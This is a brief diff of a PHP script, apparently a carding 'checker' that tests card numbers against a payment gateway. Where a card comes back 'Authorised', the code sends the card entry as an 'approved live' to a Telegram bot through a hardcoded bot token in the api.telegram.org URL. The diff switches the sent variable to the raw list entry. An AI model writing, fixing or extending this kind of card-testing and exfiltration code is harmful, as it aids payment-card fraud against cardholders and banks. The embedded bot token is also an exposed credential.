@@ -998,7 +998,7 @@ if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mes
     echo "Aprovada $lista | Authorised  usa";
     
     // Enviar live aprovada para o bot do Telegram
-$mensagem = urlencode("✅ Live aprovada: $live_aprovada"); // substitua pela variável correta
+$mensagem = urlencode("✅ Live aprovada: $lista"); // substitua pela variável correta
 file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQPzCUgUPiUfO4k/sendMessage?chat_id=SUBSTITUIR_CHAT_ID&text={$mensagem}");
     exit();
 } else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
@@ -1022,6 +1022,7 @@ file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQ
     exit();
 }
 ?>
+
 
 
 
